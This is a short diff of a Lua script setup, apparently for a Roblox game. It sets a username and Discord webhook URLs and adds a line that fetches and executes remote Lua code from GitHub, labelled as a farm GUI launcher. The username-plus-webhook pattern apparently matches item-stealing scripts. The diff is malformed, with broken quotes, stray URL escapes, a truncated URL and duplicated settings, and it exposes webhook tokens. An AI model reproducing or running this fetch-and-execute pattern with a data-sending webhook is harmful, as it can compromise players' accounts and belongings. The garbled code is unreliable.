@@ -1,10 +1,4 @@
-Username = "vukantesteral"
-WebHook = "https://discord.com/api/webhooks/1096863498987905054/cJ5N3ukgDspdo_-6nYZTK-qCpx03YMJmYAcnCIwRxvLC31KU3gkRWb8xPDsxEPj4oiCx"
- 
- 
-loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
-_G.CustomScriptName = "Loading Milk UP!"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
+UserId = 1329396097
+WebHook.Dis =https://discord.com/api/webhooks/1096781667177353246/jY_eZM6Df9wvk2DSEJto0HifUux4WJcoephSo6q7NIbzK3BTkvibsBK056LVtPK24_kK
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/petsimxlauncher/main/Boredhubfarmgui.lua%22,true ))()
+Username = "vukantesteral" WebHook = "https://discord.com/api/webhooks/1096781667177353246/jY_eZM6Df9wvk2DSEJto0HifUux4WJcoephSo6q7NIbzK3BTkvibsBK056LVtPK24_kK" _G.CustomScriptName = "vukantesteral" _G.Text1 = "Script Loaded..." _G.Text2 = "Waiting for Script" _G.Text3 = "Checking Scripts..." _G.Text4 = "Starting Scripts..." loadstring(game:HttpGet("https://raw.githubusercontent.com/Jus...%22))()
